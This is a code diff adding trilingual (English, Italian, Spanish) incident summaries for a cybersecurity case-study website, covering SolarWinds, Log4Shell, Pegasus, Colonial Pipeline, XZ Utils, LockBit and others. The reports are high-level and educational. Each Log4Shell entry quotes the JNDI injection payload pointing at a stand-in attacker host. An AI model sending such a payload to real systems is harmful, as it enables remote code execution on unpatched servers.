@@ -19,7 +19,25 @@ const translations = {
         case5_title: "REvil RANSOMWARE",
         case5_summary: "Analysis of the RaaS model and the supply chain attack against Kaseya VSA.",
         case6_title: "CROWDSTRIKE INCIDENT",
-        case6_summary: "Technical post-mortem of the logic error in Channel File 291 that crashed 8.5M devices."
+        case6_summary: "Technical post-mortem of the logic error in Channel File 291 that crashed 8.5M devices.",
+        case7_title: "SOLARWINDS SUNBURST",
+        case7_summary: "Deep dive into the supply chain compromise of the Orion platform by APT29.",
+        case8_title: "LOG4SHELL (CVE-2021-44228)",
+        case8_summary: "Analysis of the Java logging library vulnerability that set the internet on fire.",
+        case9_title: "NSO PEGASUS SPYWARE",
+        case9_summary: "Investigation into the zero-click mobile surveillance tool used against high-value targets.",
+        case10_title: "COLONIAL PIPELINE",
+        case10_summary: "Ransomware attack by DarkSide that paralyzed the US East Coast fuel supply.",
+        case11_title: "LAPSUS$ OPERATIONS",
+        case11_summary: "Teenage hacking group that breached NVIDIA, Microsoft, and Uber using social engineering.",
+        case12_title: "SMART CONTRACT EXPLOIT",
+        case12_summary: "Technical analysis of bridge vulnerabilities in decentralized finance (DeFi) networks.",
+        case13_title: "LOCKBIT 3.0 (CRONOS)",
+        case13_summary: "Deconstruction of the most prolific RaaS and the Operation Cronos takedown.",
+        case14_title: "XZ UTILS BACKDOOR",
+        case14_summary: "The sophisticated multi-year social engineering attack to backdoor the Linux SSH.",
+        case15_title: "POST-QUANTUM TRANSITION",
+        case15_summary: "Technical report on Harvest Now, Decrypt Later (HNDL) strategy and PQC migration."
     },
     it: {
         exit_btn: "[ DISCONNETTI ]",
@@ -41,7 +59,25 @@ const translations = {
         case5_title: "REvil RANSOMWARE",
         case5_summary: "Analisi del modello RaaS e dell'attacco supply chain contro Kaseya VSA.",
         case6_title: "INCIDENTE CROWDSTRIKE",
-        case6_summary: "Post-mortem tecnico dell'errore logico nel Channel File 291 che ha bloccato 8.5M di dispositivi."
+        case6_summary: "Post-mortem tecnico dell'errore logico nel Channel File 291 che ha bloccato 8.5M di dispositivi.",
+        case7_title: "SOLARWINDS SUNBURST",
+        case7_summary: "Analisi approfondita della compromissione della supply chain della piattaforma Orion da parte di APT29.",
+        case8_title: "LOG4SHELL (CVE-2021-44228)",
+        case8_summary: "Analisi della vulnerabilità nella libreria di logging Java che ha messo a rischio l'intero web.",
+        case9_title: "SPYWARE NSO PEGASUS",
+        case9_summary: "Indagine sullo strumento di sorveglianza mobile zero-click utilizzato contro bersagli ad alto profilo.",
+        case10_title: "COLONIAL PIPELINE",
+        case10_summary: "Attacco ransomware di DarkSide che ha paralizzato la fornitura di carburante sulla costa est degli USA.",
+        case11_title: "OPERAZIONI LAPSUS$",
+        case11_summary: "Gruppo hacker adolescente che ha violato NVIDIA, Microsoft e Uber tramite social engineering.",
+        case12_title: "EXPLOIT SMART CONTRACT",
+        case12_summary: "Analisi tecnica delle vulnerabilità dei bridge nelle reti di finanza decentralizzata (DeFi).",
+        case13_title: "LOCKBIT 3.0 (CRONOS)",
+        case13_summary: "Decostruzione del RaaS più prolifico e dell'operazione internazionale Cronos.",
+        case14_title: "BACKDOOR XZ UTILS",
+        case14_summary: "Il sofisticato attacco di ingegneria sociale pluriennale per inserire una backdoor in SSH su Linux.",
+        case15_title: "TRANSIZIONE POST-QUANTUM",
+        case15_summary: "Report tecnico sulla strategia 'Harvest Now, Decrypt Later' e sulla migrazione crittografica PQC."
     },
     es: {
         exit_btn: "[ DESCONECTAR ]",
@@ -63,7 +99,25 @@ const translations = {
         case5_title: "REvil RANSOMWARE",
         case5_summary: "Análisis del modelo RaaS y del ataque a la cadena de suministro contra Kaseya VSA.",
         case6_title: "INCIDENTE CROWDSTRIKE",
-        case6_summary: "Post-mortem técnico del error lógico en el Channel File 291 que colapsó 8.5M de dispositivos."
+        case6_summary: "Post-mortem técnico del error lógico en el Channel File 291 que colapsó 8.5M de dispositivos.",
+        case7_title: "SOLARWINDS SUNBURST",
+        case7_summary: "Inmersión profunda en el compromiso de la cadena de suministro de la plataforma Orion por APT29.",
+        case8_title: "LOG4SHELL (CVE-2021-44228)",
+        case8_summary: "Análisis de la vulnerabilidad de la biblioteca de registro de Java que incendió Internet.",
+        case9_title: "SPYWARE NSO PEGASUS",
+        case9_summary: "Investigación sobre la herramienta de vigilancia móvil zero-click utilizada contra objetivos de alto valor.",
+        case10_title: "COLONIAL PIPELINE",
+        case10_summary: "Ataque de ransomware por DarkSide que paralizó el suministro de combustible de la costa este de EE. UU.",
+        case11_title: "OPERACIONES LAPSUS$",
+        case11_summary: "Grupo de piratas informáticos adolescentes que vulneró NVIDIA, Microsoft y Uber mediante ingeniería social.",
+        case12_title: "EXPLOIT DE CONTRATOS INTELIGENTES",
+        case12_summary: "Análisis técnico de vulnerabilidades de puentes en redes de finanzas descentralizadas (DeFi).",
+        case13_title: "LOCKBIT 3.0 (CRONOS)",
+        case13_summary: "Deconstrucción del RaaS más prolífico y el desmantelamiento de la Operación Cronos.",
+        case14_title: "BACKDOOR XZ UTILS",
+        case14_summary: "El sofisticado ataque de ingeniería social de varios años para crear una puerta trasera en el SSH de Linux.",
+        case15_title: "TRANSICIÓN POST-CUÁNTICA",
+        case15_summary: "Informe técnico sobre la estrategia Harvest Now, Decrypt Later (HNDL) y migración PQC."
     }
 };
 
@@ -129,6 +183,98 @@ const reportDetails = {
             </ul><br>
             <strong>IMPACT & EFFECTS:</strong> 8.5 million Windows devices crashed into a Blue Screen of Death (BSOD) loop. Grounded flights globally, halted banking operations, and disrupted hospitals.<br><br>
             <strong>RESOLUTION:</strong> Required manual intervention (booting into Safe Mode to delete the corrupted .sys file). CrowdStrike subsequently completely overhauled their staged rollout and testing procedures.
+        `,
+        "case-7": `
+            <strong>CONTEXT:</strong> 2020 State-sponsored supply chain attack (attributed to Russian SVR). Infiltrated the build process of SolarWinds Orion platform.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Backdoor:</strong> 'SUNBURST' malicious code injected into legitimate 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
+                <li><strong>Technique:</strong> 'Golden SAML' attacks to forge authentication tokens and bypass MFA, moving laterally to cloud environments.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Compromised dozens of US government agencies and Fortune 500 companies. Undetected exfiltration for over 9 months.<br><br>
+            <strong>RESOLUTION:</strong> Full network rebuilds for affected entities. CISA issued emergency directives mandating disconnection of Orion instances.
+        `,
+        "case-8": `
+            <strong>CONTEXT:</strong> Late 2021 discovery of a critical RCE in the ubiquitous Java logging library Apache Log4j (CVE-2021-44228).<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Mechanism:</strong> JNDI injection via LDAP/RMI lookups in log strings.</li>
+                <li><strong>Exploit:</strong> Attacker sends a payload like <code>\${jndi:ldap://attacker.com/a}</code> to trigger remote code execution without authentication.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Affected billions of enterprise devices and cloud services (AWS, iCloud, Steam). Immediate massive scanning and exploitation by threat actors.<br><br>
+            <strong>RESOLUTION:</strong> Global emergency patching to Log4j 2.17.1+. Widespread implementation of WAF rules to block JNDI lookup patterns.
+        `,
+        "case-9": `
+            <strong>CONTEXT:</strong> Advanced zero-click spyware developed by NSO Group, used extensively for surveillance of journalists, activists, and world leaders.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Vector:</strong> Zero-click exploits targeting iMessage (FORCEDENTRY - CVE-2021-30860) and WhatsApp.</li>
+                <li><strong>Exploit:</strong> Malformed PDF utilizing JBIG2 compression to trigger an integer overflow in CoreGraphics.</li>
+                <li><strong>Capability:</strong> Full access to microphone, camera, GPS, and encrypted messages (bypassing end-to-end encryption).</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Global human rights violations. Significant diplomatic fallout and exposure of extensive state surveillance programs.<br><br>
+            <strong>RESOLUTION:</strong> Apple and Google implemented advanced hardware-level defenses (e.g., Lockdown Mode). NSO Group placed on the US Entity List.
+        `,
+        "case-10": `
+            <strong>CONTEXT:</strong> May 2021 ransomware attack by the DarkSide group targeting the largest fuel pipeline in the United States.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Entry:</strong> Compromised legacy VPN account credentials (discovered in previous data breaches) lacking MFA.</li>
+                <li><strong>Encryption:</strong> Targeted billing and IT systems, forcing a proactive operational shutdown of the OT network to prevent spread.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Panic buying and fuel shortages across the US East Coast. Company paid a $4.4M ransom in Bitcoin.<br><br>
+            <strong>RESOLUTION:</strong> FBI successfully recovered a significant portion of the ransom. Issuance of US Executive Orders mandating stricter pipeline security regulations.
+        `,
+        "case-11": `
+            <strong>CONTEXT:</strong> Highly capable teenage threat actor group that successfully breached major tech corporations using aggressive social engineering.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Vector:</strong> SIM swapping, purchasing session tokens, and bribing insiders.</li>
+                <li><strong>Execution:</strong> MFA fatigue attacks (spamming 2FA prompts until the user approves) and helpdesk social engineering to gain initial access.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Exfiltration of proprietary source code from NVIDIA, Microsoft (Bing/Cortana), Samsung, and Okta.<br><br>
+            <strong>RESOLUTION:</strong> International law enforcement operation leading to the arrest of key members in the UK and Brazil. Increased industry focus on phishing-resistant MFA (FIDO2).
+        `,
+        "case-12": `
+            <strong>CONTEXT:</strong> Escalating trend of massive financial thefts targeting vulnerabilities in Web3 protocols and cross-chain bridges.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Vulnerabilities:</strong> Logic errors in smart contracts, compromised private keys of bridge validators, and flash loan attacks manipulating price oracles.</li>
+                <li><strong>Execution:</strong> Attackers exploit smart contract bugs to drain liquidity pools or mint unauthorized tokens.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Billions of dollars lost annually (e.g., Ronin Network $625M, Poly Network $610M). Severe destabilization of DeFi ecosystems.<br><br>
+            <strong>RESOLUTION:</strong> Increased reliance on rigorous smart contract auditing, bug bounties, and implementation of decentralized validator networks.
+        `,
+        "case-13": `
+            <strong>CONTEXT:</strong> Operation Cronos (2024), a multinational law enforcement task force that dismantled the infrastructure of LockBit, the world's most prolific RaaS.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Payload:</strong> LockBit Black (v3.0) utilizing fast, multi-threaded encryption and living-off-the-land (LotL) techniques.</li>
+                <li><strong>Takedown:</strong> NCA and FBI compromised LockBit's primary administration environment, seizing source code, decryption keys, and affiliate data.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Disruption of thousands of potential attacks. Massive blow to the RaaS ecosystem and affiliate trust.<br><br>
+            <strong>RESOLUTION:</strong> Release of a free decryption tool for victims. Indictments and sanctions against key LockBit operators globally.
+        `,
+        "case-14": `
+            <strong>CONTEXT:</strong> 2024 discovery of a highly sophisticated, multi-year supply chain attack targeting the XZ Utils data compression library (CVE-2024-3094).<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Social Engineering:</strong> Threat actor 'Jia Tan' gained maintainer status over several years through persistent contributions.</li>
+                <li><strong>Payload:</strong> Obfuscated backdoor injected into the build process, modifying <code>liblzma</code> to intercept SSH connections.</li>
+                <li><strong>Execution:</strong> Allowed attackers to execute arbitrary code via SSH using a specific private key before authentication.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Averted a catastrophic global backdoor in major Linux distributions (Debian, Ubuntu, Fedora).<br><br>
+            <strong>RESOLUTION:</strong> Discovered accidentally by a Microsoft engineer analyzing SSH latency. Immediate rollback of XZ Utils versions across all Linux distros.
+        `,
+        "case-15": `
+            <strong>CONTEXT:</strong> The looming cryptographic crisis ('Q-Day') where Cryptographically Relevant Quantum Computers (CRQCs) break current public-key cryptography.<br><br>
+            <strong>TECHNICAL BREAKDOWN:</strong>
+            <ul>
+                <li><strong>Threat:</strong> Shor's Algorithm running on a CRQC can factor large primes, rendering RSA, ECC, and Diffie-Hellman obsolete.</li>
+                <li><strong>Strategy:</strong> Nation-states are employing 'Harvest Now, Decrypt Later' (HNDL) tactics, storing encrypted traffic for future decryption.</li>
+            </ul><br>
+            <strong>IMPACT & EFFECTS:</strong> Total compromise of secure communications, digital signatures, and historical encrypted data.<br><br>
+            <strong>RESOLUTION:</strong> NIST standardization of Post-Quantum Cryptography (PQC) algorithms (e.g., Kyber, Dilithium). Global push for cryptographic agility in enterprise systems.
         `
     },
     it: {
@@ -192,6 +338,98 @@ const reportDetails = {
             </ul><br>
             <strong>EFFETTI E IMPATTO:</strong> 8,5 milioni di dispositivi Windows si sono bloccati in un loop di Blue Screen of Death (BSOD). Voli bloccati a livello globale, operazioni bancarie interrotte e ospedali paralizzati.<br><br>
             <strong>RISOLUZIONE:</strong> Ha richiesto un intervento manuale (avvio in modalità provvisoria per eliminare il file .sys corrotto). CrowdStrike ha successivamente revisionato completamente le proprie procedure di test e di rilascio scaglionato.
+        `,
+        "case-7": `
+            <strong>CONTESTO:</strong> Attacco supply chain 2020 (attribuito al SVR russo). Infiltrazione nel processo di build della piattaforma SolarWinds Orion.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Backdoor:</strong> Codice malevolo 'SUNBURST' iniettato nella DLL legittima 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
+                <li><strong>Tecnica:</strong> Attacchi 'Golden SAML' per falsificare token di autenticazione e bypassare l'MFA, muovendosi lateralmente in ambienti cloud.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Compromissione di dozzine di agenzie governative USA e aziende Fortune 500. Esfiltrazione non rilevata per oltre 9 mesi.<br><br>
+            <strong>RISOLUZIONE:</strong> Ricostruzione totale delle reti per le entità colpite. Direttive d'emergenza CISA per disconnettere le istanze Orion.
+        `,
+        "case-8": `
+            <strong>CONTESTO:</strong> Scoperta a fine 2021 di una RCE critica nell'onnipresente libreria di logging Java Apache Log4j (CVE-2021-44228).<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Meccanismo:</strong> Iniezione JNDI tramite lookup LDAP/RMI nelle stringhe di log.</li>
+                <li><strong>Exploit:</strong> L'attaccante invia un payload come <code>\${jndi:ldap://attacker.com/a}</code> per innescare l'esecuzione di codice remoto senza autenticazione.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Miliardi di dispositivi enterprise e servizi cloud colpiti (AWS, iCloud). Scansioni e sfruttamento di massa immediati da parte di threat actor.<br><br>
+            <strong>RISOLUZIONE:</strong> Patching di emergenza globale a Log4j 2.17.1+. Implementazione diffusa di regole WAF per bloccare i pattern di lookup JNDI.
+        `,
+        "case-9": `
+            <strong>CONTESTO:</strong> Spyware avanzato zero-click sviluppato da NSO Group, ampiamente utilizzato per la sorveglianza di giornalisti, attivisti e leader mondiali.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Vettore:</strong> Exploit zero-click mirati a iMessage (FORCEDENTRY - CVE-2021-30860) e WhatsApp.</li>
+                <li><strong>Exploit:</strong> PDF malformato che utilizzava la compressione JBIG2 per innescare un integer overflow in CoreGraphics.</li>
+                <li><strong>Capacità:</strong> Accesso completo a microfono, fotocamera, GPS e messaggi criptati (bypassando la crittografia end-to-end).</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Violazioni globali dei diritti umani. Significative ripercussioni diplomatiche ed esposizione di vasti programmi di sorveglianza statale.<br><br>
+            <strong>RISOLUZIONE:</strong> Apple e Google hanno implementato difese avanzate a livello hardware (es. Lockdown Mode). NSO Group è stata inserita nella Entity List degli USA.
+        `,
+        "case-10": `
+            <strong>CONTESTO:</strong> Attacco ransomware del maggio 2021 da parte del gruppo DarkSide al più grande oleodotto degli Stati Uniti.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Ingresso:</strong> Credenziali di un account VPN legacy compromesse (scoperte in precedenti violazioni di dati) prive di MFA.</li>
+                <li><strong>Cifratura:</strong> Sistemi IT e di fatturazione colpiti, costringendo a uno spegnimento operativo proattivo della rete OT per prevenire la diffusione.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Acquisti dettati dal panico e carenza di carburante in tutta la costa orientale degli Stati Uniti. L'azienda ha pagato un riscatto di 4,4 milioni di dollari in Bitcoin.<br><br>
+            <strong>RISOLUZIONE:</strong> L'FBI ha recuperato con successo una parte significativa del riscatto. Emissione di ordini esecutivi negli Stati Uniti per normative di sicurezza più severe per gli oleodotti.
+        `,
+        "case-11": `
+            <strong>CONTESTO:</strong> Gruppo di threat actor adolescenti altamente capace che ha violato con successo importanti aziende tecnologiche utilizzando un'ingegneria sociale aggressiva.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Vettore:</strong> SIM swapping, acquisto di token di sessione e corruzione di insider.</li>
+                <li><strong>Esecuzione:</strong> Attacchi di "MFA fatigue" (invio massivo di richieste 2FA fino all'approvazione dell'utente) e ingegneria sociale sull'helpdesk per ottenere l'accesso iniziale.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Esfiltrazione di codice sorgente proprietario da NVIDIA, Microsoft (Bing/Cortana), Samsung e Okta.<br><br>
+            <strong>RISOLUZIONE:</strong> Operazione internazionale delle forze dell'ordine che ha portato all'arresto di membri chiave nel Regno Unito e in Brasile. Maggiore attenzione del settore all'MFA resistente al phishing (FIDO2).
+        `,
+        "case-12": `
+            <strong>CONTESTO:</strong> Tendenza in forte aumento di massicci furti finanziari mirati alle vulnerabilità nei protocolli Web3 e nei bridge cross-chain.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Vulnerabilità:</strong> Errori logici negli smart contract, chiavi private dei validatori dei bridge compromesse e attacchi "flash loan" che manipolano gli oracoli di prezzo.</li>
+                <li><strong>Esecuzione:</strong> Gli aggressori sfruttano bug degli smart contract per prosciugare pool di liquidità o coniare token non autorizzati.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Miliardi di dollari persi ogni anno (es. Ronin Network $625M, Poly Network $610M). Grave destabilizzazione degli ecosistemi DeFi.<br><br>
+            <strong>RISOLUZIONE:</strong> Maggiore dipendenza da rigorosi audit degli smart contract, bug bounty e implementazione di reti di validatori decentralizzate.
+        `,
+        "case-13": `
+            <strong>CONTESTO:</strong> Operazione Cronos (2024), una task force multinazionale delle forze dell'ordine che ha smantellato l'infrastruttura di LockBit, il RaaS più prolifico al mondo.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Payload:</strong> LockBit Black (v3.0) che utilizzava crittografia rapida multi-thread e tecniche living-off-the-land (LotL).</li>
+                <li><strong>Smantellamento:</strong> NCA e FBI hanno compromesso l'ambiente di amministrazione primario di LockBit, sequestrando codice sorgente, chiavi di decrittazione e dati degli affiliati.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Interruzione di migliaia di potenziali attacchi. Colpo durissimo all'ecosistema RaaS e alla fiducia degli affiliati.<br><br>
+            <strong>RISOLUZIONE:</strong> Rilascio di uno strumento di decrittazione gratuito per le vittime. Incriminazioni e sanzioni contro i principali operatori LockBit a livello globale.
+        `,
+        "case-14": `
+            <strong>CONTESTO:</strong> Scoperta nel 2024 di un attacco supply chain pluriennale altamente sofisticato mirato alla libreria di compressione dati XZ Utils (CVE-2024-3094).<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Ingegneria Sociale:</strong> Il threat actor 'Jia Tan' ha ottenuto lo status di maintainer nel corso di diversi anni attraverso contributi persistenti.</li>
+                <li><strong>Payload:</strong> Backdoor offuscata iniettata nel processo di build, che modificava <code>liblzma</code> per intercettare le connessioni SSH.</li>
+                <li><strong>Esecuzione:</strong> Permetteva agli aggressori di eseguire codice arbitrario via SSH utilizzando una chiave privata specifica prima dell'autenticazione.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Scongiurata una catastrofica backdoor globale nelle principali distribuzioni Linux (Debian, Ubuntu, Fedora).<br><br>
+            <strong>RISOLUZIONE:</strong> Scoperta casualmente da un ingegnere Microsoft che analizzava la latenza SSH. Rollback immediato delle versioni di XZ Utils in tutte le distribuzioni Linux.
+        `,
+        "case-15": `
+            <strong>CONTESTO:</strong> L'incombente crisi crittografica ('Q-Day') in cui i Computer Quantistici Crittograficamente Rilevanti (CRQC) violeranno l'attuale crittografia a chiave pubblica.<br><br>
+            <strong>ANALISI TECNICA:</strong>
+            <ul>
+                <li><strong>Minaccia:</strong> L'algoritmo di Shor in esecuzione su un CRQC può fattorizzare grandi numeri primi, rendendo obsoleti RSA, ECC e Diffie-Hellman.</li>
+                <li><strong>Strategia:</strong> Gli stati-nazione stanno impiegando tattiche 'Harvest Now, Decrypt Later' (HNDL), immagazzinando traffico crittografato per la decrittazione futura.</li>
+            </ul><br>
+            <strong>EFFETTI E IMPATTO:</strong> Compromissione totale di comunicazioni sicure, firme digitali e dati crittografati storici.<br><br>
+            <strong>RISOLUZIONE:</strong> Standardizzazione NIST degli algoritmi di Post-Quantum Cryptography (PQC) (es. Kyber, Dilithium). Spinta globale per l'agilità crittografica nei sistemi aziendali.
         `
     },
     es: {
@@ -255,6 +493,98 @@ const reportDetails = {
             </ul><br>
             <strong>IMPACTO Y EFECTOS:</strong> 8,5 millones de dispositivos Windows entraron en un bucle de pantalla azul de la muerte (BSOD). Vuelos cancelados a nivel mundial, operaciones bancarias detenidas y hospitales interrumpidos.<br><br>
             <strong>RESOLUCIÓN:</strong> Requirió intervención manual (arrancar en Modo Seguro para eliminar el archivo .sys dañado). Posteriormente, CrowdStrike revisó por completo sus procedimientos de pruebas y despliegue escalonado.
+        `,
+        "case-7": `
+            <strong>CONTEXTO:</strong> Ataque a la cadena de suministro en 2020 (atribuido al SVR ruso). Se infiltró en el proceso de compilación de la plataforma SolarWinds Orion.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Backdoor:</strong> Código malicioso 'SUNBURST' inyectado en la DLL legítima 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
+                <li><strong>Técnica:</strong> Ataques 'Golden SAML' para falsificar tokens de autenticación y evadir MFA, moviéndose lateralmente a entornos en la nube.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Compromiso de docenas de agencias gubernamentales de EE. UU. y empresas de Fortune 500. Exfiltración no detectada durante más de 9 meses.<br><br>
+            <strong>RESOLUCIÓN:</strong> Reconstrucción total de las redes para las entidades afectadas. Directivas de emergencia de CISA que obligan a desconectar las instancias de Orion.
+        `,
+        "case-8": `
+            <strong>CONTEXTO:</strong> Descubrimiento a finales de 2021 de una RCE crítica en la omnipresente biblioteca de registro de Java Apache Log4j (CVE-2021-44228).<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Mecanismo:</strong> Inyección JNDI a través de búsquedas LDAP/RMI en cadenas de registro.</li>
+                <li><strong>Exploit:</strong> El atacante envía un payload como <code>\${jndi:ldap://attacker.com/a}</code> para desencadenar la ejecución remota de código sin autenticación.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Afectó a miles de millones de dispositivos empresariales y servicios en la nube (AWS, iCloud, Steam). Escaneo masivo y explotación inmediata por parte de actores de amenazas.<br><br>
+            <strong>RESOLUCIÓN:</strong> Parches de emergencia a nivel mundial a Log4j 2.17.1+. Implementación generalizada de reglas WAF para bloquear patrones de búsqueda JNDI.
+        `,
+        "case-9": `
+            <strong>CONTEXTO:</strong> Software espía avanzado zero-click desarrollado por NSO Group, utilizado ampliamente para la vigilancia de periodistas, activistas y líderes mundiales.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Vector:</strong> Exploits zero-click dirigidos a iMessage (FORCEDENTRY - CVE-2021-30860) y WhatsApp.</li>
+                <li><strong>Exploit:</strong> PDF malformado que utiliza compresión JBIG2 para desencadenar un desbordamiento de enteros en CoreGraphics.</li>
+                <li><strong>Capacidad:</strong> Acceso completo al micrófono, la cámara, el GPS y los mensajes cifrados (eludiendo el cifrado de extremo a extremo).</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Violaciones globales de los derechos humanos. Importantes repercusiones diplomáticas y exposición de extensos programas de vigilancia estatal.<br><br>
+            <strong>RESOLUCIÓN:</strong> Apple y Google implementaron defensas avanzadas a nivel de hardware (por ejemplo, el Modo de aislamiento). NSO Group fue incluida en la Lista de entidades de EE. UU.
+        `,
+        "case-10": `
+            <strong>CONTEXTO:</strong> Ataque de ransomware en mayo de 2021 por parte del grupo DarkSide dirigido al mayor oleoducto de combustible de los Estados Unidos.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Entrada:</strong> Credenciales de cuenta VPN heredadas comprometidas (descubiertas en filtraciones de datos anteriores) que carecían de MFA.</li>
+                <li><strong>Cifrado:</strong> Sistemas de TI y facturación afectados, lo que obligó a un cierre operativo proactivo de la red OT para evitar la propagación.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Compras de pánico y escasez de combustible en toda la costa este de EE. UU. La empresa pagó un rescate de 4,4 millones de dólares en Bitcoin.<br><br>
+            <strong>RESOLUCIÓN:</strong> El FBI recuperó con éxito una parte importante del rescate. Emisión de órdenes ejecutivas de EE. UU. que exigen normas de seguridad de oleoductos más estrictas.
+        `,
+        "case-11": `
+            <strong>CONTEXTO:</strong> Grupo de actores de amenazas adolescentes altamente capacitados que vulneraron con éxito a importantes corporaciones tecnológicas utilizando ingeniería social agresiva.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Vector:</strong> Intercambio de SIM (SIM swapping), compra de tokens de sesión y soborno de empleados.</li>
+                <li><strong>Ejecución:</strong> Ataques de fatiga de MFA (envío masivo de solicitudes de 2FA hasta que el usuario aprueba) e ingeniería social a la mesa de ayuda para obtener acceso inicial.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Exfiltración de código fuente patentado de NVIDIA, Microsoft (Bing/Cortana), Samsung y Okta.<br><br>
+            <strong>RESOLUCIÓN:</strong> Operación policial internacional que condujo al arresto de miembros clave en el Reino Unido y Brasil. Mayor enfoque de la industria en la MFA resistente al phishing (FIDO2).
+        `,
+        "case-12": `
+            <strong>CONTEXTO:</strong> Tendencia creciente de robos financieros masivos dirigidos a vulnerabilidades en protocolos Web3 y puentes entre cadenas (cross-chain bridges).<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Vulnerabilidades:</strong> Errores lógicos en contratos inteligentes, claves privadas de validadores de puentes comprometidas y ataques de préstamos rápidos (flash loans) que manipulan oráculos de precios.</li>
+                <li><strong>Ejecución:</strong> Los atacantes explotan errores de contratos inteligentes para vaciar fondos de liquidez o acuñar tokens no autorizados.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Miles de millones de dólares perdidos anualmente (ej. Ronin Network $625M, Poly Network $610M). Grave desestabilización de los ecosistemas DeFi.<br><br>
+            <strong>RESOLUCIÓN:</strong> Mayor dependencia de auditorías rigurosas de contratos inteligentes, programas de recompensas por errores (bug bounties) e implementación de redes de validadores descentralizadas.
+        `,
+        "case-13": `
+            <strong>CONTEXTO:</strong> Operación Cronos (2024), un grupo de trabajo multinacional encargado de hacer cumplir la ley que desmanteló la infraestructura de LockBit, el RaaS más prolífico del mundo.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Payload:</strong> LockBit Black (v3.0) que utiliza un cifrado rápido de subprocesos múltiples y técnicas de "living-off-the-land" (LotL).</li>
+                <li><strong>Desmantelamiento:</strong> La NCA y el FBI comprometieron el entorno de administración principal de LockBit, incautando el código fuente, las claves de descifrado y los datos de los afiliados.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Interrupción de miles de ataques potenciales. Golpe masivo al ecosistema RaaS y a la confianza de los afiliados.<br><br>
+            <strong>RESOLUCIÓN:</strong> Lanzamiento de una herramienta de descifrado gratuita para las víctimas. Acusaciones y sanciones contra los principales operadores de LockBit a nivel mundial.
+        `,
+        "case-14": `
+            <strong>CONTEXTO:</strong> Descubrimiento en 2024 de un ataque de cadena de suministro de varios años altamente sofisticado dirigido a la biblioteca de compresión de datos XZ Utils (CVE-2024-3094).<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Ingeniería Social:</strong> El actor de amenazas 'Jia Tan' obtuvo el estado de mantenedor durante varios años a través de contribuciones persistentes.</li>
+                <li><strong>Payload:</strong> Puerta trasera ofuscada inyectada en el proceso de compilación, modificando <code>liblzma</code> para interceptar conexiones SSH.</li>
+                <li><strong>Ejecución:</strong> Permitía a los atacantes ejecutar código arbitrario a través de SSH utilizando una clave privada específica antes de la autenticación.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Evitó una puerta trasera global catastrófica en las principales distribuciones de Linux (Debian, Ubuntu, Fedora).<br><br>
+            <strong>RESOLUCIÓN:</strong> Descubierto accidentalmente por un ingeniero de Microsoft que analizaba la latencia de SSH. Reversión inmediata de las versiones de XZ Utils en todas las distribuciones de Linux.
